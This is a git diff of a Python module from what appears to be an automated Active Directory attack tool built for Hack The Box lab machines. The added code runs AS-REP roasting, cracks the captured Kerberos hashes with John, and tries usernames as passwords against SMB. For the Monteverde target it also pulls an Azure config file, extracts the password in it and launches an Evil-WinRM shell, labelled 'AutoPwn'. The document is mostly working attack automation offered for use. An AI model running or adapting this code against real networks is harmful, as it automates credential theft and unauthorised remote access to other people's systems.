45d2ad4f673a412f0d2c69968a65ab6fed331f13
Knowledge-Wisdom-Understanding <philmiller1992@gmail.com>
2020-01-12 01:59:15 -0500

    ActiveDirectory :boom: Steve Erkle :sparkles:

--- lib/ldapEnum.py
+++ lib/ldapEnum.py
@@ -105,7 +105,7 @@ class LdapEnum:
                 users = parse_users()
                 domain = parse_ldap_domain()
                 if len(domain) == 1 and (len(users) != 0):
-                    dope_cmd = f"""{c.getCmd("ldap", "GetNPUsers", target=self.target ,domain=str(domain[0]))}"""
+                    dope_cmd = f"""{c.getCmd("ldap", "GetNPUsers", domain=str(domain[0]))}"""
                     print(f"[{fg.li_magenta}+{fg.rs}] {dope_cmd}")
                     call(dope_cmd, shell=True)
 
@@ -118,7 +118,7 @@ class LdapEnum:
                     # print(hashes)
                     if not os.path.exists(c.getPath("loot", "lootDir")):
                         os.makedirs(c.getPath("loot", "lootDir"))
-                    hash_file = open(c.getPath("loot", "krbHashes"), "w+")
+                    hash_file = open(c.getPath("loot", "krbHashes"), "w")
                     if len(hashes) != 0:
                         for i in hashes:
                             hash_file.write(i.rstrip() + "\n")
@@ -132,6 +132,9 @@ class LdapEnum:
                     print(f"[{fg.li_magenta}+{fg.rs}] BruteForcing The Hash!")
                     john_cmd = c.getCmd("john", "jcrack", hashfile=f"{c.getPath('loot', 'krbHashes')}")
                     call(john_cmd, shell=True)
+                    return True
+                else:
+                    return False
 
             def parseCreds():
                 def cmdline(command):
@@ -152,35 +155,119 @@ class LdapEnum:
                                 # print(i.split(":")[1])
                         return zip(usernames, passwords)
 
-            def checkWinRm():
-                HeresJonny()
-                r = requests.post(f"http://{self.target}:5985/wsman", data="")
-                if r.status_code == 401:
+            def usernameAsPassword():
+                if os.path.exists(c.getPath("wordlists", "ldapUsernames")):
                     try:
-                        user_pass = dict(parseCreds())
-                    except TypeError as te:
-                        print(te)
+                        acc_check_cmd = c.getCmd("ldap", "authCheck")
+                        call(acc_check_cmd, shell=True)
+                    except IOError as err:
+                        print(err)
                         return 1
-                    users = []
-                    passwords = []
-                    for k, v in user_pass.items():
-                        users.append(k)
-                        passwords.append(v)
-                    if len(users) != 0 and (len(passwords) != 0):
-                        try:
-                            dope = f"""{c.getCmd("winrm", "evilWinRM", username=users[0], password=passwords[0], SHELL="$SHELL")}"""
-                            print(f"[{fg.li_magenta}+{fg.rs}] Found Valid Credentials!!!")
-                            print(f"[{fg.li_magenta}+{fg.rs}] {fg.li_green}{user_pass}{fg.rs}")
-                            print(f"[{fg.li_magenta}+{fg.rs}] Evil-WinRM !!!")
-                            print(f"[{fg.li_magenta}+{fg.rs}] " + dope)
-                            print(f"[{fg.li_magenta}+{fg.rs}] Enjoy the Shell Playboy ;) ")
-                            kwargs = {}
-                            kwargs.update(start_new_session=True)
-                            revshell = Popen(args=dope, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True, **kwargs)
-                            assert not revshell.poll()
 
-                        except IOError as e:
-                            print(e)
-                            exit()
+            def parse_acc_check():
+                if os.path.exists(c.getPath("smb", "smbAuthCheck")):
+                    try:
+                        with open(c.getPath("smb", "smbAuthCheck"), "r") as smbAuth:
+                            successful_login_check = [x for x in sorted(set(line.rstrip() for line in smbAuth)) if x.startswith("        SUCCESS....")]
+                            # print(successful_login_check)
+                            if successful_login_check:
+                                with open(c.getPath("loot", "creds"), "w") as credentials:
+                                    for i in successful_login_check:
+                                        credentials.write(i.lstrip())
+                                regex = re.compile(r"\b(\w+)\s*:\s*([^:]*)(?=\s+\w+\s*:|$)")
+                                d = dict(regex.findall(str(successful_login_check).replace("'", "").replace('"', '').replace(']', '')))
+                                valid_pass = d['password']
+                                return valid_pass
+
+                    except FileNotFoundError as fnf_err:
+                        print(fnf_err)
+                        return 1
+
+            def monteverde(password):
+                if os.path.exists(c.getPath("loot", "authSmbmap")):
+                    download_azure_config = c.getCmd("smb", "azure", validPass=password)
+                    print(download_azure_config)
+                    call(download_azure_config, shell=True)
+                    try:
+                        if os.path.exists(f"{os.getcwd()}/10.10.10.172-users_mhope_azure.xml"):
+                            from shutil import move
+                            move(f"{os.getcwd()}/10.10.10.172-users_mhope_azure.xml", c.getPath("loot", "azure"))
+                    except FileNotFoundError as fnf_err:
+                        print(fnf_err)
+                    if os.path.exists(c.getPath("loot", "azure")):
+                        try:
+                            import xmltodict
+                            with open(c.getPath("loot", "azure"), "rb") as azure_file:
+                                doc = xmltodict.parse(azure_file.read())
+                                azure_pass = doc['Objs']['Obj']['Props']['S']['#text']
+                                try:
+                                    dope = f"""{c.getCmd("winrm", "evilWinRM", username='mhope', password=azure_pass, SHELL="$SHELL")}"""
+                                    print(f"[{fg.li_magenta}+{fg.rs}] Found Valid Credentials!!!")
+                                    print(f"[{fg.li_magenta}+{fg.rs}] {fg.li_green}{azure_pass}{fg.rs}")
+                                    print(f"[{fg.li_magenta}+{fg.rs}] Evil-WinRM !!!")
+                                    print(f"[{fg.li_magenta}+{fg.rs}] " + dope)
+                                    print(f"[{fg.li_magenta}+{fg.rs}] Enjoy the Shell Playboy ;) ")
+                                    kwargs = {}
+                                    kwargs.update(start_new_session=True)
+                                    revshell = Popen(args=dope, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True, **kwargs)
+                                    assert not revshell.poll()
+
+                                except IOError as e:
+                                    print(e)
+                                    exit()
+                        except FileNotFoundError as fnf_err:
+                            print(fnf_err)
+
+            def checkWinRm():
+                if HeresJonny() is True:
+                    r = requests.post(f"http://{self.target}:5985/wsman", data="")
+                    if r.status_code == 401:
+                        try:
+                            user_pass = dict(parseCreds())
+                        except TypeError as te:
+                            print(te)
+                            return 1
+                        users = []
+                        passwords = []
+                        for k, v in user_pass.items():
+                            users.append(k)
+                            passwords.append(v)
+                        if len(users) != 0 and (len(passwords) != 0):
+                            try:
+                                dope = f"""{c.getCmd("winrm", "evilWinRM", username=users[0], password=passwords[0], SHELL="$SHELL")}"""
+                                print(f"[{fg.li_magenta}+{fg.rs}] Found Valid Credentials!!!")
+                                print(f"[{fg.li_magenta}+{fg.rs}] {fg.li_green}{user_pass}{fg.rs}")
+                                print(f"[{fg.li_magenta}+{fg.rs}] Evil-WinRM !!!")
+                                print(f"[{fg.li_magenta}+{fg.rs}] " + dope)
+                                print(f"[{fg.li_magenta}+{fg.rs}] Enjoy the Shell Playboy ;) ")
+                                kwargs = {}
+                                kwargs.update(start_new_session=True)
+                                revshell = Popen(args=dope, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True, **kwargs)
+                                assert not revshell.poll()
+
+                            except IOError as e:
+                                print(e)
+                                exit()
+                else:
+                    print(f"[{fg.red}+{fg.rs}] No valid Credentials Found. {fg.red}Try Harder{fg.rs}")
+                    if not os.path.exists(c.getPath("loot", "lootDir")):
+                        os.makedirs(c.getPath("loot", "lootDir"))
+                    usernameAsPassword()
+                    valid_password = parse_acc_check()
+                    print(f"{fg.li_green}[!]{fg.rs} Found Valid Credentials!!!\n Username: {fg.li_green}{valid_password}{fg.rs}\n Password: {fg.li_green}{valid_password}{fg.rs}\n")
+                    print(f"[{fg.li_magenta}+{fg.rs}] Running smbmap with credentials")
+                    auth_smb_check = c.getCmd("smb", "authSmb", validPass=valid_password)
+                    print(auth_smb_check)
+                    call(auth_smb_check, shell=True)
+                    if self.target == "10.10.10.172":
+                        autopwn_banner = r"""
+                         _______         __          ______
+                        |   _   |.--.--.|  |_.-----.|   __ \.--.--.--.-----.
+                        |       ||  |  ||   _|  _  ||    __/|  |  |  |     |
+                        |___|___||_____||____|_____||___|   |________|__|__|
+                                            MONTEVERDE
+                        """
+                        print(f"{fg.li_magenta}{autopwn_banner}{fg.rs}")
+                        monteverde(valid_password)
 
             checkWinRm()
